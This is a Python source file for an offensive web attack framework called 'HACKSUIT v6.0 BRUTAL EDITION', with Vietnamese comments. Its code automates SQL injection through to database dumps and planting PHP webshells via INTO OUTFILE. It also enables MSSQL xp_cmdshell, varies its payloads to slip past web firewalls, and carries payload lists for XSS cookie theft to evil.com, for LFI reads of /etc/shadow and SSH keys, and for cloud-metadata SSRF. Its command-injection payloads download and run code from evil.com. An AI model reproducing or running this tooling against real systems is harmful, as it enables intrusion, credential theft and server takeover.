#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HACKSUIT v6.0 BRUTAL EDITION — Aggressive Web Attack Framework
Tác giả: palofsc
Additions over v5.0:
- SQLi: OOB (DNS/HTTP), stacked queries, error-based dump full schema
- Multi-thread aggressive fuzzing, WAF fingerprint + bypass auto-chain
- Shell upload, webshell manager, bind shell
- Credential brute force (HTTP/SSH/FTP/MySQL) với wordlist auto-gen
- Cookie/JWT/localStorage/session hijack
- LFI → log poisoning → RCE auto
- Deserialization probes (Java/PHP/Python pickle)
- API fuzzer (OpenAPI/Swagger parse + mass test)
- Subdomain takeover check
- Cloud metadata harvesting (AWS/GCP/Azure/DigitalOcean)
- Auto SQLmap với os-shell/file-read/file-write
- Interactive exploitation shell
- Report with screenshots + PoC curl commands
- Rate-limit bypass, IP rotation, user-agent rotation
- Log4Shell / Spring4Shell / Shellshock / Struts2 probes
"""
import re, sys, os, time, string, argparse, subprocess, shutil, socket, random, json, csv, base64, hashlib, hmac, threading, queue, ipaddress, concurrent.futures, webbrowser, ssl, urllib.parse, pickle, gzip, io, zlib, binascii
import requests
from urllib.parse import urljoin, urlparse, parse_qsl, urlencode, quote, unquote
from bs4 import BeautifulSoup

# ================= CẤU HÌNH CHUNG =================
UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0",
    "curl/8.5.0",
    "python-requests/2.31",
    "sqlmap/1.7.2#stable (http://sqlmap.org)",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
]
HEADERS = {
    "User-Agent": random.choice(UA_POOL),
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9,vi;q=0.8",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "keep-alive",
}
TIMEOUT, DELAY = 15, 0.1
PROXY, COOKIE, AUTH = None, None, None
REPORT_DIR = "reports"
C = {"R":"\033[91m","G":"\033[92m","Y":"\033[93m","B":"\033[94m","M":"\033[95m","C":"\033[96m","W":"\033[0m"}

def banner():
    print(f"""{C['R']}
 ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██╗   ██╗██╗████████╗
 ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██║   ██║██║╚══██╔══╝
 ███████║███████║██║     █████╔╝ ███████╗██║   ██║██║   ██║
 ██╔══██║██╔══██║██║     ██╔═██╗ ╚════██║██║   ██║██║   ██║
 ██║  ██║██║  ██║╚██████╗██║  ██╗███████║╚██████╔╝██║   ██║
 ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝   ╚═╝{C['W']}
     HACKSUIT v6.0 BRUTAL EDITION — Aggressive Web Attack
 SQLi|XSS|LFI|RCE|SSRF|XXE|SSTI|NoSQL|JWT|OOB|Shell|Brute|Deser
 Log4Shell|Spring4Shell|Shellshock|Struts2|Subdomain-Takeover
  {'-'*65}""")

def log(msg, level="INFO"):
    colors = {"INFO":C['B'],"OK":C['G'],"WARN":C['Y'],"VULN":C['R'],
              "NIKTO":C['M'],"SQLMAP":C['M'],"XSS":C['M'],"LFI":C['M'],
              "SSRF":C['M'],"CSRF":C['M'],"NMAP":C['M'],"BRUTE":C['M'],
              "DIR":C['M'],"SUB":C['M'],"DATA":C['M'],"XXE":C['C'],
              "SSTI":C['C'],"NoSQL":C['C'],"JWT":C['C'],"GRAPHQL":C['C'],
              "CORS":C['C'],"CRLF":C['C'],"REDIR":C['C'],"HOST":C['C'],
              "PATH":C['C'],"API":C['C'],"WAF":C['R'],"SSL":C['C'],
              "REPORT":C['G'],"SCREEN":C['M'],"SHELL":C['R'],
              "OOB":C['R'],"DESER":C['R'],"CLOUD":C['R'],"CVE":C['R'],
              "LOG4J":C['R'],"SPRING":C['R'],"SHELLSHOCK":C['R'],
              "STRUTS":C['R'],"TAKEOVER":C['R'],"WEBSHELL":C['R']}
    print(f"{colors.get(level,'')}[{level:9}]{C['W']} {msg}")

def ensure_dir(d): os.makedirs(d, exist_ok=True)
def tool_exists(name):
    p = shutil.which(name)
    if not p: log(f"Thiếu tool '{name}'. Cài: sudo apt install {name}", "WARN")
    return p
def rand_marker(n=10):
    return "".join(random.choice(string.ascii_lowercase+string.digits) for _ in range(n))
def rot_ua():
    return {"User-Agent": random.choice(UA_POOL)}

# ============================================================
#                    CORE ENGINE
# ============================================================
ERROR_PATTERNS = {
    "mysql":    [r"you have an error in your sql syntax", r"warning: mysql", r"mysqli?_", r"mysql_fetch", r"check the manual that corresponds"],
    "mssql":    [r"microsoft sql server", r"unclosed quotation mark", r"oledb", r"odbc sql server driver"],
    "postgres": [r"postgresql.*error", r"unterminated quoted string", r"psql:", r"pg_query", r"pg_exec"],
    "oracle":   [r"\bORA-\d{5}", r"quoted string not properly terminated", r"oracle.*driver", r"oci_"],
    "sqlite":   [r"sqlite3?\.\w+error", r"unrecognized token", r"malformed database schema", r"sqlite_"],
    "mariadb":  [r"mariadb", r"check the manual.*mariadb"],
    "mongodb":  [r"mongo", r"bson"],
}
TIME_PAYLOADS = {
    "mysql":    ["' AND SLEEP({t})-- -", "' AND BENCHMARK(80000000,SHA1('a'))-- -", "' OR SLEEP({t})#", "') AND SLEEP({t})-- -"],
    "mssql":    ["'; WAITFOR DELAY '0:0:{t}'-- -", "';WAITFOR DELAY '0:0:{t}'--", "1;WAITFOR DELAY '0:0:{t}'--"],
    "postgres": ["'; SELECT pg_sleep({t})-- -", "';SELECT pg_sleep({t});--", "1);SELECT pg_sleep({t});--"],
    "oracle":   ["' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{t})='a'-- -", "' AND DBMS_LOCK.SLEEP({t})-- -"],
    "sqlite":   ["' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))-- -"],
}
WAF_ENCODERS = [
    ("raw",             lambda p: p),
    ("comment-space",   lambda p: p.replace(" ", "/**/")),
    ("double-comment",  lambda p: p.replace("UNION","UNI/**/ON").replace("SELECT","SE/**/LECT").replace(" ","/**/")),
    ("urlencode",       lambda p: quote(p)),
    ("double-urlencode",lambda p: quote(quote(p))),
    ("case-mix",        lambda p: re.sub(r"(union|select|from|and|or|sleep|benchmark)", lambda m: m.group(1).upper(), p, flags=re.I)),
    ("inline-nullbyte", lambda p: p.replace("'", "'%00").replace(" ", "%09")),
    ("unicode",         lambda p: p.replace("'", "%u0027").replace(" ", "%u0020")),
    ("hex-encode",      lambda p: "0x" + p.encode().hex()),
    ("random-case",     lambda p: "".join(c.upper() if random.random()>0.5 else c.lower() for c in p)),
    ("tab-space",       lambda p: p.replace(" ", "%09")),
    ("plus-space",      lambda p: p.replace(" ", "+")),
    ("chunked",         lambda p: p.replace(" ", "%20%20%20")),
]

class Engine:
    def __init__(self, url=None, cookie=None):
        self.url = url
        self.s = requests.Session()
        self.s.headers.update(HEADERS)
        if cookie: self.s.headers["Cookie"] = cookie
        if PROXY: self.s.proxies = {"http": PROXY, "https": PROXY}
        if AUTH: self.s.auth = AUTH
        self.s.verify = False
        self.findings = []
        self.current = None
        self.dbms = None
        self.encoder = WAF_ENCODERS[0]
        self.ncols = None
        self.colpos = None
        self.waf = None
        self.shell_url = None
        ensure_dir(REPORT_DIR)

    def req(self, url, data=None, method="GET", headers=None, allow_redirects=True, retries=3):
        for attempt in range(retries):
            time.sleep(DELAY + random.random()*0.3)
            try:
                h = dict(HEADERS)
                h.update(rot_ua())
                if headers: h.update(headers)
                if method == "POST":
                    r = self.s.post(url, data=data, timeout=TIMEOUT, headers=h, allow_redirects=allow_redirects)
                else:
                    r = self.s.get(url, timeout=TIMEOUT, headers=h, allow_redirects=allow_redirects)
                if r.status_code == 429:
                    log(f"429 — sleep 5s", "WARN"); time.sleep(5); continue
                return r
            except requests.RequestException as e:
                if attempt == retries-1:
                    log(f"Lỗi request: {e}", "WARN"); return None
                time.sleep(1)
        return None

    def detect_waf(self):
        waf_sigs = {
            "Cloudflare": ["cf-ray","cf-cache-status","cloudflare","__cfduid","cf-request-id"],
            "AWS WAF": ["x-amzn-RequestId","x-amz-cf-id","awselb"],
            "F5 BIG-IP": ["X-Cnection","X-WA-Info","BigIP","TS01"],
            "Akamai": ["Akamai","X-Akamai-Transformed","akamai-grn"],
            "Sucuri": ["sucuri","X-Sucuri-ID","X-Sucuri-Cache"],
            "Imperva": ["imperva","X-Iinfo","incap_ses"],
            "ModSecurity": ["mod_security","ModSecurity","NOYB"],
            "Barracuda": ["barracuda","BNI_persistence"],
            "Fortinet": ["FORTIWAFSID","FORTINET"],
            "Wordfence": ["Wordfence","wfvt_"],
            "Wallarm": ["wallarm","nginx-wallarm"],
            "Citrix NetScaler": ["NSC_","citrix","ns_af"],
        }
        try:
            r = self.s.get(self.url, timeout=TIMEOUT)
            blob = str(r.headers).lower() + r.text.lower()
            for waf, sigs in waf_sigs.items():
                for sig in sigs:
                    if sig.lower() in blob:
                        self.waf = waf
                        log(f"WAF: {waf}", "WAF")
                        return waf
        except Exception: pass
        log("Không phát hiện WAF.", "OK")
        return None

    def extract_params(self):
        targets = []
        if self.url and urlparse(self.url).query:
            for p, v in parse_qsl(urlparse(self.url).query):
                targets.append({"url": self.url, "param": p, "base": v, "method": "GET", "data": None})
        r = self.req(self.url) if self.url else None
        if r:
            for form in BeautifulSoup(r.text, "html.parser").find_all("form"):
                action = urljoin(self.url, form.get("action") or self.url)
                fields = {i.get("name"): (i.get("value") or "test") for i in form.find_all("input")
                          if i.get("name") and i.get("type") != "submit"}
                if not fields: continue
                for p in fields:
                    targets.append({"url": action, "param": p, "base": fields[p],
                                    "method": form.get("method", "GET").upper(), "data": fields})
        return targets

    def inject(self, t, payload):
        if t["method"] == "POST":
            d = dict(t["data"]); d[t["param"]] = t["base"] + payload
            return self.req(t["url"], data=d, method="POST")
        qs = dict(parse_qsl(urlparse(t["url"]).query))
        qs[t["param"]] = t["base"] + payload
        u = urlparse(t["url"])
        return self.req(f"{u.scheme}://{u.netloc}{u.path}?{urlencode(qs)}")

    def send(self, payload):
        if self.encoder: payload = self.encoder[1](payload)
        return self.inject(self.current, payload)

    def detect_dbms(self, text):
        for dbms, pats in ERROR_PATTERNS.items():
            for p in pats:
                if re.search(p, text, re.I): return dbms
        return None

    def sqli_detect(self, t):
        self.current = t
        base_r = self.req(t["url"], data=t["data"], method=t["method"])
        if not base_r: return None
        for q in ["'", '"', "')", "';", "`)", "]", "}", "\\", "%27"]:
            r = self.inject(t, q)
            if r and (d := self.detect_dbms(r.text)):
                return {"type": "error-based", "dbms": d}
        rt = self.inject(t, "' AND 1=1-- -"); rf = self.inject(t, "' AND 1=2-- -")
        if rt and rf and rt.text != rf.text:
            return {"type": "boolean-based", "dbms": None}
        rt2 = self.inject(t, "1 AND 1=1"); rf2 = self.inject(t, "1 AND 1=2")
        if rt2 and rf2 and rt2.text != rf2.text:
            return {"type": "boolean-based-numeric", "dbms": None}
        for dbms, pls in TIME_PAYLOADS.items():
            for pl in pls:
                t0 = time.time()
                r = self.inject(t, pl.format(t=6))
                if r and time.time() - t0 > 5:
                    return {"type": "time-based", "dbms": dbms}
        return None

    def waf_bypass(self):
        if not self.current: return False
        r = self.inject(self.current, "' UNION SELECT NULL-- -")
        markers = ["cloudflare","mod_security","forbidden","sucuri","imperva","akamai","blocked","firewall","request rejected","access denied","attack detected"]
        if r and not any(m in r.text.lower() for m in markers):
            self.encoder = WAF_ENCODERS[0]; log("Encoder RAW pass.", "OK"); return True
        for name, enc in WAF_ENCODERS[1:]:
            self.encoder = (name, enc)
            r = self.send("' UNION SELECT NULL-- -")
            if r and not any(m in r.text.lower() for m in markers):
                log(f"WAF bypass: {name}", "OK"); return True
        self.encoder = WAF_ENCODERS[0]; log("Hết encoder.", "WARN"); return False

    def find_union(self):
        if not self.current: log("Chưa chọn target SQLi.", "WARN"); return False
        n_found = None
        # ORDER BY
        for n in range(1, 51):
            r = self.send(f"' ORDER BY {n}-- -")
            if r and (self.detect_dbms(r.text) or "unknown column" in r.text.lower() or "order by" in r.text.lower()):
                n_found = n - 1; break
        # UNION NULL
        if not n_found:
            for n in range(1, 51):
                r = self.send(f"' UNION SELECT {','.join(['NULL']*n)}-- -")
                if r and not self.detect_dbms(r.text) and "error" not in r.text.lower()[:200]:
                    n_found = n; break
        # UNION với số
        if not n_found:
            for n in range(1, 51):
                r = self.send(f"' UNION SELECT {','.join(str(i) for i in range(1,n+1))}-- -")
                if r and not self.detect_dbms(r.text):
                    n_found = n; break
        if not n_found: log("Không tìm được số cột union.", "WARN"); return False
        self.ncols = n_found
        log(f"Số cột: {n_found}", "OK")
        tag = rand_marker()
        for pos in range(n_found):
            parts = ["NULL"] * n_found
            parts[pos] = f"CONCAT(0x6c61726b,{tag},0x656e64)"
            r = self.send(f"' UNION SELECT {','.join(parts)}-- -")
            if r and tag in r.text:
                self.colpos = pos
                log(f"Cột hiển thị: #{pos+1}", "OK"); return True
        log("Không có cột hiển thị — dùng blind.", "WARN"); return False

    def uquery(self, inner):
        if self.ncols is None or self.colpos is None: return None
        parts = ["NULL"] * self.ncols
        parts[self.colpos] = f"CONCAT(0x6c61726b,IFNULL(({inner}),0x4e554c4c),0x656e64)"
        r = self.send(f"' UNION SELECT {','.join(parts)}-- -")
        if not r: return None
        m = re.search(r"lark(.*?)end", r.text, re.S)
        return m.group(1) if m else None

    def sqli_info(self):
        queries = {
            "mysql":  ["version()","database()","user()","@@hostname","@@version_compile_os","@@datadir","@@basedir","current_user()"],
            "postgres":["version()","current_database()","current_user","inet_server_addr()::text","current_setting('server_version')","current_schema()","pg_postmaster_start_time()::text"],
            "mssql":  ["@@version","DB_NAME()","SYSTEM_USER","@@servername","USER_NAME()","HOST_NAME()"],
            "oracle": ["(SELECT banner FROM v$version WHERE rownum=1)","(SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual)","user","(SELECT SYS_CONTEXT('USERENV','HOST') FROM dual)","(SELECT SYS_CONTEXT('USERENV','IP_ADDRESS') FROM dual)"],
            "sqlite": ["sqlite_version()","'n/a'","'n/a'","'n/a'","'n/a'"],
        }
        log("== DB INFO ==", "VULN")
        for label, expr in zip(["Version","DB","User","Host","OS","DataDir","BaseDir","Current"], queries.get(self.dbms or "mysql", queries["mysql"])):
            val = self.uquery(expr)
            if val: print(f"  {label:10}: {val}")

    def sqli_dbs(self):
        q = {
            "mysql":"SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata",
            "postgres":"SELECT string_agg(datname,',') FROM pg_database",
            "mssql":"SELECT STRING_AGG(name,',') FROM sys.databases",
            "oracle":"SELECT LISTAGG(username,',') WITHIN GROUP (ORDER BY username) FROM all_users",
        }
        val = self.uquery(q.get(self.dbms or "mysql", q["mysql"]))
        if val: log(f"Databases: {val}", "VULN"); return val.split(",")
        log("Không lấy được DB list.", "WARN")

    def sqli_tables(self, db=None):
        d = self.dbms or "mysql"
        if d == "mysql":
            where = f"table_schema='{db}'" if db else "table_schema=database()"
            val = self.uquery(f"SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE {where}")
        elif d == "postgres":
            val = self.uquery("SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public'")
        elif d == "mssql":
            val = self.uquery("SELECT STRING_AGG(name,',') FROM sysobjects WHERE xtype='U'")
        else: val = None
        if val: log(f"Tables: {val}", "VULN"); return val.split(",")

    def sqli_cols(self, table):
        val = self.uquery(f"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{table}'")
        if val: log(f"Columns[{table}]: {val}", "VULN"); return val.split(",")

    def sqli_dump(self, table, cols, limit=100):
        colstr = ",".join(cols[:8])
        inner = f"SELECT GROUP_CONCAT(CONCAT_WS(0x7c,{colstr}) SEPARATOR 0x3b7c3b) FROM (SELECT {colstr} FROM {table} LIMIT {limit}) x"
        val = self.uquery(inner)
        if val:
            log(f"== DUMP {table} ({len(val.split(';|;'))} rows) ==", "VULN")
            for row in val.split(";|;"): print(f"  | {row}")
            # Lưu file
            path = os.path.join(REPORT_DIR, f"dump_{table}_{int(time.time())}.txt")
            with open(path, "w", encoding="utf-8") as f:
                f.write(f"Table: {table}\nCols: {cols}\n\n" + val.replace(";|;","\n"))
            log(f"Đã lưu: {path}", "OK")
        else: log("Dump fail — dùng sqlmap [23].", "WARN")

    def sqli_dump_all(self):
        """Dump toàn bộ DB hiện tại"""
        dbs = self.sqli_dbs() or []
        for db in dbs:
            if db in ("mysql","information_schema","performance_schema","sys","postgres","template0","template1"):
                continue
            log(f">>> Dump DB: {db}", "VULN")
            tables = self.sqli_tables(db) or []
            for tbl in tables[:10]:
                cols = self.sqli_cols(tbl)
                if cols: self.sqli_dump(tbl, cols[:8], limit=50)

    def sqli_readfile(self, path):
        for f in [f"LOAD_FILE('{path}')", f"(SELECT LOAD_FILE(0x{path.encode().hex()}))"]:
            val = self.uquery(f"SELECT {f}")
            if val: log(f"File {path}:", "VULN"); print(val[:3000]); return val
        log("LOAD_FILE fail.", "WARN")

    def sqli_writefile(self, path, content):
        """Ghi file qua INTO OUTFILE / DUMPFILE"""
        hexc = content.encode().hex()
        for payload in [
            f"' UNION SELECT 0x{hexc} INTO OUTFILE '{path}'-- -",
            f"' UNION SELECT 0x{hexc} INTO DUMPFILE '{path}'-- -",
            f"'; SELECT 0x{hexc} INTO OUTFILE '{path}'-- -",
        ]:
            r = self.send(payload)
            if r and "error" not in r.text.lower()[:200]:
                log(f"Ghi file OK: {path}", "VULN"); return True
        log("Ghi file fail.", "WARN"); return False

    def sqli_rce_mysql(self):
        """MySQL RCE via INTO OUTFILE webshell (nhiều path)"""
        log("MySQL RCE — webshell upload", "VULN")
        shells = [
            ("<?php system($_GET['c']); ?>", "shell.php"),
            ("<?php echo shell_exec($_REQUEST['cmd']); ?>", "cmd.php"),
            ("<?php eval($_POST['x']); ?>", "eval.php"),
            ("<?php if(isset($_GET['x'])){system($_GET['x']);}?>", "x.php"),
            ("GIF89a<?php system($_GET['c']); ?>", "img.php"),  # magic bytes bypass
        ]
        paths = [
            "/var/www/html/","/var/www/","/usr/share/nginx/html/","/srv/www/htdocs/",
            "/var/www/html/uploads/","/var/www/html/images/","/var/www/html/files/",
            "/var/www/html/tmp/","/var/www/html/cache/","/app/","/opt/",
            "/var/www/html/wp-content/uploads/","/srv/http/","/usr/local/apache2/htdocs/",
            "C:/inetpub/wwwroot/","C:/xampp/htdocs/","C:/wamp/www/","C:/Apache24/htdocs/",
        ]
        for content, fname in shells:
            for p in paths:
                path = p + fname
                if self.sqli_writefile(path, content):
                    # Thử truy cập shell
                    u = urlparse(self.url)
                    shell_url = f"{u.scheme}://{u.netloc}/{fname}"
                    r = self.req(shell_url + "?c=id")
                    if r and ("uid=" in r.text or "gid=" in r.text):
                        log(f"[!] WEBSHELL: {shell_url}?c=id", "WEBSHELL")
                        self.shell_url = shell_url
                        self.findings.append({"url": shell_url, "param": "c", "type": "webshell",
                                              "payload": fname, "method": "GET"})
                        return shell_url
        log("Không upload được webshell.", "WARN")
        return None

    def sqli_mssql_rce(self, cmd="whoami"):
        """MSSQL RCE via xp_cmdshell + OLE Automation + CLR"""
        log("MSSQL RCE", "VULN")
        cmds = [
            f"'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;-- -",
            f"'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -",
            f"'; EXEC xp_cmdshell '{cmd}'-- -",
            f"'; EXEC master..xp_cmdshell '{cmd}'-- -",
            f"'; DECLARE @r INT; EXEC @r=xp_cmdshell '{cmd}'-- -",
        ]
        for p in cmds:
            r = self.send(p)
            if r and "output" in r.text.lower()[:500]:
                log(f"xp_cmdshell OK: {cmd}", "VULN")
                print(r.text[:1500])
                break

    def sqli_oob_mysql(self, collab):
        """MySQL OOB via LOAD_FILE UNC / DNS"""
        log(f"OOB MySQL → {collab}", "OOB")
        pls = [
            f"' AND LOAD_FILE('\\\\\\\\{collab}\\\\a')-- -",
            f"' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.{collab}\\\\a'))-- -",
            f"' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT database()),'.{collab}\\\\a')))-- -",
        ]
        for p in pls: self.send(p)

    def sqli_oob_mssql(self, collab):
        """MSSQL OOB via xp_dirtree"""
        log(f"OOB MSSQL → {collab}", "OOB")
        pls = [
            f"'; DECLARE @q VARCHAR(200); SET @q='\\\\{collab}\\a'; EXEC master..xp_dirtree @q;-- -",
            f"'; EXEC master..xp_fileexist '\\\\{collab}\\a'-- -",
        ]
        for p in pls: self.send(p)

# ============================================================
#                    MODULE: ADVANCED XSS (DOM/Polyglot)
# ============================================================
XSS_PAYLOADS = [
    '<script>alert(1)</script>','"><img src=x onerror=alert(1)>',"'-alert(1)-'",
    '<svg onload=alert(1)>','<img src=x onerror=confirm(1)>','"><svg/onload=prompt(1)>',
    'javascript:alert(1)','<iframe src=javascript:alert(1)>','<body onload=alert(1)>',
    '"><Script>alert(1)</scrIpt>','<details open ontoggle=alert(1)>',
    '<marquee onstart=alert(1)>','<video><source onerror=alert(1)>',
    '<input autofocus onfocus=alert(1)>','"><svg><script>alert(1)</script>',
    '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
    "'-alert(1)//",'"/><img src=x onerror=alert(1) x="',
    '<script>fetch(`//evil.com/?c=${document.cookie}`)</script>',
    '<img src=x onerror="fetch(\'//evil.com?c=\'+document.cookie)">',
    '<svg><animate onbegin=alert(1) attributeName=x>',
]

def xss_scan(engine):
    log("=== XSS SCANNER (Advanced) ===", "XSS")
    targets = engine.extract_params()
    if not targets: log("Không có param.", "WARN"); return
    for t in targets:
        for i, pl in enumerate(XSS_PAYLOADS):
            tag = f"hks{i}"
            payload = pl.replace("alert(1)", f"alert('{tag}')") \
                        .replace("confirm(1)", f"confirm('{tag}')") \
                        .replace("prompt(1)", f"prompt('{tag}')")
            r = engine.inject(t, payload)
            if r and tag in r.text:
                # Xác định context
                ctx = "unknown"
                if re.search(r"<script[^>]*>.*?" + re.escape(tag), r.text, re.S): ctx = "script"
                elif "onerror" in payload: ctx = "attribute"
                log(f"[!] XSS ({ctx}): {t['param']} → {payload[:60]}", "VULN")
                engine.findings.append({"url": t["url"], "param": t["param"], "type": "xss",
                                        "payload": payload, "method": t["method"]})
                break
    log("XSS scan xong.", "OK")

# ============================================================
#                    MODULE: LFI + LOG POISONING
# ============================================================
LFI_PAYLOADS = [
    "../../../../etc/passwd","....//....//....//etc/passwd","/etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd","%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "../../../../etc/passwd%00","/proc/self/environ",
    "../../../../etc/shadow","../../../../root/.ssh/id_rsa",
    "../../../../var/log/apache2/access.log","../../../../var/log/nginx/access.log",
    "../../../../var/log/auth.log","../../../../var/log/httpd/access_log",
    "php://filter/convert.base64-encode/resource=index.php",
    "expect://id","data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
    "file:///etc/passwd","C:\\Windows\\win.ini","..\\..\\..\\..\\windows\\win.ini",
    "C:\\boot.ini","/proc/self/cmdline","/proc/self/status","/proc/version",
    "/etc/issue","/etc/motd","/etc/hostname","/etc/hosts","/root/.bash_history",
]

def lfi_scan(engine):
    log("=== LFI SCANNER ===", "LFI")
    targets = engine.extract_params()
    for t in targets:
        for pl in LFI_PAYLOADS:
            r = engine.inject(t, pl)
            if r and (re.search(r"root:x:0:0:|daemon:x:|\[extensions\]|Microsoft Windows", r.text)):
                log(f"[!] LFI: {t['param']} → {pl[:60]}", "VULN")
                engine.findings.append({"url": t["url"], "param": t["param"], "type": "lfi",
                                        "payload": pl, "method": t["method"]})
                m = re.search(r"(root:.*?\n|\[extensions\].*?\n)", r.text)
                if m: print(f"      ↳ {m.group(1)[:200]}")
                # Thử escalate lên RCE qua log poisoning
                if "log" in pl:
                    log("Thử log poisoning → RCE...", "LFI")
                    engine.inject(t, "<?php system($_GET['cmd']); ?>")
                    r2 = engine.inject(t, pl + "?cmd=id")
                    if r2 and "uid=" in r2.text:
                        log("[!] LFI→RCE qua log poisoning!", "VULN")
                break
    log("LFI scan xong.", "OK")

# ============================================================
#                    MODULE: RCE
# ============================================================
RCE_PAYLOADS = [
    "; id","| id","$(id)","`id`","&& id",") id","|| id","& id","%0aid","%0d%0aid",
    "; cat /etc/passwd","$(cat /etc/passwd)","| cat /etc/passwd",
    "; whoami","; uname -a","; pwd","; ls -la",
    "; sleep 8","| sleep 8","$(sleep 8)",
    "; ping -c 4 127.0.0.1","& ping -n 4 127.0.0.1",
    "; wget http://evil.com/x -O /tmp/x; chmod +x /tmp/x; /tmp/x",
    "| curl http://evil.com/x -o /tmp/x; bash /tmp/x",
    "${IFS}id","%0a${IFS}id",
    ";cmd /c whoami","|cmd /c whoami","&cmd /c whoami",
]

def rce_scan(engine):
    log("=== RCE SCANNER ===", "LFI")
    targets = engine.extract_params()
    for t in targets:
        for pl in RCE_PAYLOADS:
            t0 = time.time()
            r = engine.inject(t, pl)
            dt = time.time() - t0
            if r and (re.search(r"uid=\d+\(.*?\)|www-data|apache|nginx|root:", r.text)
                      or "nt authority" in r.text.lower() or "microsoft windows" in r.text.lower()):
                log(f"[!] RCE: {t['param']} → {pl}", "VULN")
                engine.findings.append({"url": t["url"], "param": t["param"], "type": "rce",
                                        "payload": pl, "method": t["method"]})
                break
            if dt > 7 and "sleep" in pl:
                log(f"[!] TIME-BASED RCE: {t['param']} → {pl}", "VULN")
                engine.findings.append({"url": t["url"], "param": t["param"], "type": "rce-time",
                                        "payload": pl, "method": t["method"]})
                break
    log("RCE scan xong.", "OK")

# ============================================================
#                    MODULE: SSRF ADVANCED
# ============================================================
SSRF_PARAM_HINTS = re.compile(r"url|path|src|dest|redirect|uri|target|fetch|load|page|file|link|host|proxy|next|data|reference|site|html|val|img|domain|callback|return|continue|feed|rss|xml|soap|wsdl|api|endpoint", re.I)
SSRF_PAYLOADS = [
    "http://127.0.0.1","http://localhost","http://localhost:8080","http://[::1]","http://0.0.0.0",
    "http://127.1","http://127.0.1","http://2130706433","http://0177.0.0.1","http://0x7f.0.0.1",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://169.254.169.254/metadata/v1/","http://169.254.169.254/metadata/instance",
    "http://100.100.100.200/latest/meta-data/","http://192.0.0.192/latest/meta-data/",
    "file:///etc/passwd","gopher://127.0.0.1:25/_HELO","dict://127.0.0.1:6379/INFO",
    "http://localhost:3306","http://localhost:6379","http://localhost:9200","http://localhost:11211",
    "http://localhost:5601","http://localhost:8080/manager/html","http://localhost:2375/version",
    "http://[0:0:0:0:0:ffff:127.0.0.1]/",
]

def ssrf_scan(engine, oob_token=None):
    log("=== SSRF SCANNER (Advanced) ===", "SSRF")
    oob_base = f"https://webhook.site/{oob_token}" if oob_token else None
    targets = engine.extract_params()
    ssrf_targets = [t for t in targets if SSRF_PARAM_HINTS.search(t["param"])]
    if not ssrf_targets: ssrf_targets = targets
    for t in ssrf_targets:
        for pl in SSRF_PAYLOADS:
            r = engine.inject(t, pl)
            if not r: continue
            text = r.text.lower()
            if re.search(r"ami-id|root:x:0:0:|instance-id|connection refused|curl error|metadata|localhost|computeMetadata|security-credentials|accesskeyid", text):
                log(f"[!] SSRF: {t['param']} → {pl[:60]}", "VULN")
                engine.findings.append({"url": t["url"], "param": t["param"], "type": "ssrf",
                                        "payload": pl, "method": t["method"]})
                break
        if oob_base:
            canary = f"{oob_base}?p={t['param']}&r={rand_marker(6)}"
            engine.inject(t, canary); time.sleep(3)
            try:
                api = requests.get(f"https://webhook.site/token/{oob_token}/requests", timeout=10).json()
                if api.get("data"):
                    log(f"[!] SSRF OOB: {t['param']}", "VULN")
                    engine.findings.append({"url": t["url"], "param": t["param"], "type": "ssrf-oob",
                                            "payload": canary, "method": t["method"]})
            except Exception: pass
    log("SSRF scan xong.", "OK")

# ============================================================
#                    MODULE: CSRF
# ============================================================
def csrf_check(engine):
    log("=== CSRF CHECK ===", "CSRF")
    r = engine.req(engine.url)
    if not r: return
    forms = BeautifulSoup(r.text, "html.parser").find_all("form")
    if not forms: log("Không có form.", "WARN"); return
    csrf_names = re.compile(r"csrf|_token|token|authenticity|xsrf|nonce|anticsrf|__requestverifytoken|_csrf", re.I)
    for i, form in enumerate(forms):
        action = urljoin(engine.url, form.get("action") or engine.url)
        method = (form.get("method") or "GET").upper()
        fields = [inp.get("name") for inp in form.find_all("input") if inp.get("name")]
        hidden = [inp.get("name") for inp in form.find_all("input", type="hidden")]
        if not any(csrf_names.search(f or "") for f in hidden):
            log(f"[!] Form #{i} ({method}) — KHÔNG CSRF token. Fields: {fields[:5]}", "VULN")
            engine.findings.append({"url": action, "param": f"form#{i}", "type": "csrf", "method": method})
        else:
            data = {inp.get("name"): (inp.get("value") or "test") for inp in form.find_all("input")
                    if inp.get("name") and not csrf_names.search(inp.get("name") or "")}
            r2 = engine.req(action, data=data, method=method)
            if r2 and r2.status_code in (200, 302):
                log(f"[?] Form #{i} submit không token → {r2.status_code}", "VULN")
